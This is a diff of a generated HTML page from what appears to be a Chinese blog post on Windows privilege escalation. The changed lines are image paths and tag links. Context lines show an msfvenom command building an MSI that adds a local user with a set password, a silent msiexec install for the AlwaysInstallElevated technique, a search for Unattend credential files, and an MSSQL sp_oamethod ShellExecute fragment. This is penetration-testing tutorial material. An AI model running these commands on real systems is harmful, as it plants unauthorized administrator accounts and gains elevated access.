@@ -452,7 +452,7 @@ msf6 exploit(multi/script/web_delivery) &gt;</code></pre>
 C:\Documents and Settings\Administrator&gt;</code></pre>
 
 <p>会出现问题，目前没有解决方案</p>
-<p><img src="C:\blog\pic\1.png" srcset="/img/loading.gif" alt="image-20201118104027316"></p>
+<p><img src="%5Cimages%5C1.png%5C" srcset="/img/loading.gif" alt="q"></p>
 <p>可以选择上线木马获取shell</p>
 <p>目标中</p>
 <pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\D</span>ocuments and Settings<span class="hljs-symbol">\A</span>dministrator&gt;at 10:49 C:<span class="hljs-symbol">\D</span>ocuments and Settings<span class="hljs-symbol">\A</span>dmin
@@ -622,14 +622,14 @@ ler /v AlwaysInstallElevated
 错误: 系统找不到指定的注册表项或值。</code></pre>
 
 <p>如果存在漏洞会输出以下</p>
-<p><img src="C:\blog\pic\2.png" srcset="/img/loading.gif" alt="image-20201120125225703"></p>
+<p><img src="%5Cimages%5C2.png%5C" srcset="/img/loading.gif" alt="q"></p>
 <p>使用msf生成msi文件进行提权</p>
 <p><code>msfvenom -p windows/adduser USER=test000 PASSWORD=password123! -f msi -o rotten.msi</code></p>
 <p>目标机执行</p>
 <p><code>msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\rotten.msi </code></p>
 <p>​             /quiet :安装过程中禁止向用户发送消息 ; /qn : 不使用GUI ;   /i : 安装程序</p>
 <p>成功：</p>
-<p><img src="C:\blog\pic\3.png" srcset="/img/loading.gif" alt="image-20201120125306948"></p>
+<p><img src="%5Cimages%5C3.png%5C" srcset="/img/loading.gif" alt="q"></p>
 <h3 id="6-Unattended-Installs"><a href="#6-Unattended-Installs" class="headerlink" title="6.Unattended Installs"></a>6.Unattended Installs</h3><p>自动安装允许程序在不需要管理员关注下自动安装。这种解决方案用于在拥有较多雇员和时间紧缺的较大 型组织中部署程序。如果管理员没有进行清理的话，那么会有一个名为Unattend的XML文件残存在系统上。 这个XML文件包含所有在安装程序过程中的配置，包括一些本地用户的配置，以及管理员账户。</p>
 <p>全盘搜索Unattend文件是个好办法，它通常会在以下一个文件夹中：</p>
 <pre><code class="hljs shell">C:\Windows\Panther\ 
@@ -882,9 +882,9 @@ exec sp_oamethod @o，&#39;ShellExecute &#39;,null，&#39;cmd.exe&quot; , &#39; 
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/msf%E6%8F%90%E6%9D%83/">msf提权</a>
-                    
                       <a class="hover-with-bg" href="/tags/bypassuac/">bypassuac</a>
+                    
+                      <a class="hover-with-bg" href="/tags/msf%E6%8F%90%E6%9D%83/">msf提权</a>
                     
                       <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83-Windows-exploit-suggester%E3%80%81msf/">漏洞提权(Windows-exploit-suggester、msf)</a>
                     
@@ -912,6 +912,12 @@ exec sp_oamethod @o，&#39;ShellExecute &#39;,null，&#39;cmd.exe&quot; , &#39; 
                 <div class="post-prevnext row">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2020/10/01/linux%E6%8F%90%E6%9D%83-user-root/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">linux提权(user->root)</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
